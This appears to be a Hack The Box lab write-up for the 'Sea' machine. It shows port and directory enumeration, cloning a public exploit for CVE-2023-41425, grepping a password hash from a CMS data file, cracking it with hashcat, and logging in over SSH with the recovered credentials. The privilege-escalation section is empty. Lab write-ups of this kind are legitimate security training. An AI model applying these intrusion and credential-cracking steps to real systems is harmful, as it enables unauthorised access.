# Sea Write-up

<img src="https://labs.hackthebox.com/storage/avatars/0011f6725aed869f8683589cb08c90d0.png" width="200" height="200">

## Recon 

### Port enumeration with Nmap

`nmap -sC -sV 10.10.11.28`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
    |   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
    |_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41
    |_http-title: Sea - Home
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    Service Info: Host: sea.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Add `sea.htb` to `/etc/hosts`

    echo "10.10.11.28 sea.htb" | sudo tee -a /etc/hosts 

### Directory enumeration with Dirsearch

`python3 dirsearch.py -e php,html,js -u http://sea.htb 404,403,401,307`
                                      
    200 -    3KB - /404                                                                                   
    200 -    3KB - /contact.php                                      
    301 -  228B  - /data  ->  http://sea.htb/data/                                                       
    301 -  232B  - /messages  ->  http://sea.htb/messages/                                     
    301 -  231B  - /plugins  ->  http://sea.htb/plugins/             
    301 -  230B  - /themes  ->  http://sea.htb/themes/                   

![image](https://github.com/user-attachments/assets/fc57769e-68e8-428d-a7be-641db54399e1)

`python3 dirsearch.py -e php,html,js -u http://sea.htb/themes 404,403,401,307 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

    200 -    4KB - /themes/home                                      
    200 -    3KB - /themes/404                                       
    301 -  235B  - /themes/bike  ->  http://sea.htb/themes/bike/

![image](https://github.com/user-attachments/assets/f354c8b8-084e-4394-87b7-a8e128c3c87a)
   
`python3 dirsearch.py -e php,html,js -u http://sea.htb/themes/bike/ 404,403,401,307 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

    200 -    6B  - /themes/bike/version                              
    301 -  239B  - /themes/bike/img  ->  http://sea.htb/themes/bike/img/
    200 -    4KB - /themes/bike/home
    301 -  239B  - /themes/bike/css  ->  http://sea.htb/themes/bike/css/
    200 -   66B  - /themes/bike/summary                              
    200 -    3KB - /themes/bike/404                                  
    200 -    1KB - /themes/bike/LICENSE    

Let's check `sea.htb/themes/bike/LICENSE` and `sea.htb/themes/bike/summary`

![image](https://github.com/user-attachments/assets/7f3da3a7-1a99-4407-afbc-d589a8d3f5d2)

![image](https://github.com/user-attachments/assets/850e7ee9-d03c-46a2-bf53-07aa681a5a62)

## Exploitation

### CVE-2023-41425


    git clone https://github.com/prodigiousMind/CVE-2023-41425

![image](https://github.com/user-attachments/assets/19b772ec-4df9-4e14-ae4e-f2ee2b26564b)


![image](https://github.com/user-attachments/assets/e5e9ae5a-d9f1-4f91-baa0-82e10279429f)

![image](https://github.com/user-attachments/assets/4d290636-9b9a-4eae-999b-638138e681ab)

    cd /var/www/sea/data
    
    сat database.js | grep password

![image](https://github.com/user-attachments/assets/817e4a2e-3405-4329-9099-342adc7a4747)

hash `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`

    echo -n '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt

    hashcat -m 3200 -a 0 hash.txt /home/kali/wordlist/rockyou.txt 

![image](https://github.com/user-attachments/assets/d5277a85-d87f-43cc-a22a-08d6c405a9c9)

`$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q`:`mychemicalromance`

### SSH

Connet to SSH with `amay`:`mychemicalromance` credentials

ssh amay@sea.htb

## Get the user flag!

![image](https://github.com/user-attachments/assets/0c9d2c75-78ba-42e1-a255-de032d0c9076)

## Privilege Escalation

